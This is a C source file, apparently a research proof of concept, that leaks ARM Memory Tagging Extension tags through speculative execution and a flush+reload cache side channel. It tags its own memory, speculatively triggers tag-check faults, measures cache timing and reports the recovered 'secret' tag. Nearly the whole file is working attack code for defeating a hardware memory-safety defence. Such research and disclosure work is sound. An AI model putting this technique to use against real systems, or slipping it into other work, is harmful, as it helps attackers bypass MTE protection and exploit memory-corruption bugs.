/*
 * To be compiled with -march=armv8.5-a+memtag
 */
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sched.h>
#include <string.h>
#include <stdint.h>
#include <limits.h>

#include <assert.h>

#include <fr.h>


// Tunables
#define USE_INDEPENDENT_LOADS
#define __MTE_MODE PR_MTE_TCF_ASYNC


/*
 * From arch/arm64/include/uapi/asm/hwcap.h
 */
#define HWCAP2_MTE              (1 << 18)

/*
 * From arch/arm64/include/uapi/asm/mman.h
 */
#define PROT_MTE                 0x20

/*
 * From include/uapi/linux/prctl.h
 */
#define PR_SET_TAGGED_ADDR_CTRL 55
#define PR_GET_TAGGED_ADDR_CTRL 56
# define PR_TAGGED_ADDR_ENABLE  (1UL << 0)
# define PR_MTE_TCF_SHIFT       1
#ifndef PR_MTE_TCF_NONE
# define PR_MTE_TCF_NONE        (0UL << PR_MTE_TCF_SHIFT)
#endif
#ifndef PR_MTE_TCF_SYNC
# define PR_MTE_TCF_SYNC        (1UL << PR_MTE_TCF_SHIFT)
#endif
#ifndef PR_MTE_TCF_ASYNC
# define PR_MTE_TCF_ASYNC       (2UL << PR_MTE_TCF_SHIFT)
#endif
#ifndef PR_MTE_TCF_MASK
# define PR_MTE_TCF_MASK        (3UL << PR_MTE_TCF_SHIFT)
#endif
# define PR_MTE_TAG_SHIFT       3
# define PR_MTE_TAG_MASK        (0xffffUL << PR_MTE_TAG_SHIFT)

/* Macros for tagging pointers with a desired tag */
#define MT_TAG_SHIFT		56
#define MT_TAG_MASK		    0xFUL
#define MT_CLEAR_TAG(x)		( (void*)((uintptr_t)(x) & ~(MT_TAG_MASK << MT_TAG_SHIFT)) )
#define MT_SET_TAG(x, y)	( (void*)((uintptr_t)(x) | ((y) << MT_TAG_SHIFT)) )
#define MT_FETCH_TAG(x)		(((uintptr_t)(x) >> MT_TAG_SHIFT) & (MT_TAG_MASK))

/*
 * Insert a random logical tag into the given pointer.
 */
#define insert_random_tag(ptr) ({                       \
        uint64_t __val;                                 \
        asm("irg %0, %1" : "=r" (__val) : "r" (ptr));   \
        __val;                                          \
})

/*
 * Set the allocation tag on the destination address.
 */
#define set_tag(tagged_addr) do {                                      \
        asm volatile("stg %0, [%0]" : : "r" (tagged_addr) : "memory"); \
} while (0)

unsigned long long spec_tag_test(unsigned char *buff, uintptr_t arch_tag, uintptr_t spec_tag)
{
#define STT_TAG_GRAN 16
#define STT_ITER        (STT_TAG_GRAN+1)
#define STT_ARCH_SIGNAL '+'
#define STT_SPEC_SIGNAL '-'

    static unsigned char sig_array[4096*STT_ITER];
    unsigned char *buff_spec = buff+16;
    unsigned char* signal_page = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_MTE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    // set up signal markers: arch + spec (MTE granule "out of bounds")
    memset(signal_page, STT_ARCH_SIGNAL, STT_TAG_GRAN);
    signal_page[STT_TAG_GRAN] = STT_SPEC_SIGNAL;

    printf("spec_tag_test: arch_tag=%lu, spec_tag=%lu, arch_signal=%c, spec_signal=%c\n", arch_tag, spec_tag, STT_ARCH_SIGNAL, STT_SPEC_SIGNAL);

    /* Reset flush+reload buffers. */
    fr_reset();

    /*
     * Architectural accesses at [buff;buff+16),
     * speculative access at [buff+16]. Set tags accordingly.
     */
#ifndef USE_INDEPENDENT_LOADS
    memset(buff, STT_ARCH_SIGNAL, STT_TAG_GRAN);
    buff[STT_TAG_GRAN] = STT_SPEC_SIGNAL;
#endif

    buff = MT_SET_TAG(buff, arch_tag);
    buff_spec = MT_SET_TAG(buff_spec, spec_tag);

    /* For each flush+reload iteration. */
    for (int i=0; i<FR_ITERATIONS; i++) {
        /* Flush variable controlling branch to speculate on. */
        arch_flush(&sig_array[4096*(STT_ITER-1)]);

        /* Make sure everything else is cached and tags are set. Hope they don't vanish... */
        set_tag(buff);
        set_tag(buff_spec);
        for (int j=0; j<STT_ITER-1; j++) {
#ifdef USE_INDEPENDENT_LOADS
            sig_array[4096*j] = signal_page[j];
#else
            sig_array[4096*j] = buff[j];
#endif
        }

        /* Run for STT_TAG_GRAN + 1 iterations. */
        for (int j=0; j<STT_ITER; j++) {
            /* Will mispredict on the last iteration matching STT_SPEC_SIGNAL. */
            if (sig_array[4096*j] == STT_ARCH_SIGNAL) {

#ifdef USE_INDEPENDENT_LOADS
                #pragma unroll
                for (int c=0; c<CHECK_COUNT; c++) {
                    /* Issue MTE tag violation speculatively. */
                    *(volatile char *)(&buff[j]);
                }

                /* Spill the arch/spec signals into the reload buffers. */
                #pragma unroll
                for (int b=0; b<FR_BUFF_N; b++) {
                    /* Contention caused by checks: side channel on independent loads */
                    fr_load(fr_item_to_addr(signal_page[j], b));
                    // alternatively: fr_store(fr_item_to_addr(signal_page[j], b));
                }
#else
                #pragma unroll
                for (int b=0; b<FR_BUFF_N; b++) {
                    /* Dependent loads */
                    fr_load(fr_item_to_addr(buff[j], b));
                }
#endif
            }
#if CHECK_COUNT == 1
            // with 1 check on the pixel 8 the contention is not enough, the speculation
            // likely exceeds the loop and starts affecting the runs.
            arch_memory_barrier();
#endif
        }

        /* Reload the items we care about. */
        fr_reload_items(STT_ARCH_SIGNAL, STT_SPEC_SIGNAL);
        sched_yield();
    }
    unsigned long long result = fr_histogram[STT_SPEC_SIGNAL];

    /* Dump signal. */
    fr_histogram_dump();

    /* Clear tags. */
    buff = MT_CLEAR_TAG(buff);
    buff_spec = MT_CLEAR_TAG(buff_spec);
    set_tag(buff);
    set_tag(buff_spec);

    return result;
}

int main()
{
        unsigned char *a;
        unsigned long page_sz = sysconf(_SC_PAGESIZE);
        unsigned long hwcap2 = getauxval(AT_HWCAP2);

        /* check if MTE is present */
        if (!(hwcap2 & HWCAP2_MTE))
                return EXIT_FAILURE;

        /*
         * Enable the tagged address ABI, synchronous or asynchronous MTE
         * tag check faults (based on per-CPU preference) and allow all
         * non-zero tags in the randomly generated set.
         */
        if (prctl(PR_SET_TAGGED_ADDR_CTRL,
                  PR_TAGGED_ADDR_ENABLE | __MTE_MODE |
                  (0xfffe << PR_MTE_TAG_SHIFT),
                  0, 0, 0)) {
                perror("prctl() failed");
                return EXIT_FAILURE;
        }

        a = mmap(0, page_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (a == MAP_FAILED) {
                perror("mmap() failed");
                return EXIT_FAILURE;
        }

        /*
         * Enable MTE on the above anonymous mmap. The flag could be passed
         * directly to mmap() and skip this step.
         */
        if (mprotect(a, page_sz, PROT_READ | PROT_WRITE | PROT_MTE)) {
                perror("mprotect() failed");
                return EXIT_FAILURE;
        }

        fr_init();
#if FR_CALIBRATE
#ifdef USE_INDEPENDENT_LOADS
        fr_calibrate(1);
#else
        fr_calibrate(0);
#endif
#endif

        #define MAX_TAG 15

        /* Pick any secret tag to leak. */
        unsigned char secret_tag = 5;
        printf("*** Secret tag is '%d'.\n", secret_tag);

        /* Try all the tags and pick the one with the strongest signal. */
        unsigned long long hits, max_hits = 0;
        unsigned char max_hits_tag = 0;
        for (int i=0; i<MAX_TAG+1; i++) {
            if (i == secret_tag)
                printf("vvvvvvvvvv\n");
            hits = spec_tag_test(a, secret_tag, i);
            if (hits < max_hits)
                continue;
            max_hits = hits;
            max_hits_tag = i;
            if (i == secret_tag)
                printf("^^^^^^^^^^\n");
        }
        printf("*** Leaked tag is '%d' (secret tag was '%d').\n", max_hits_tag, secret_tag);

        return 0;
}
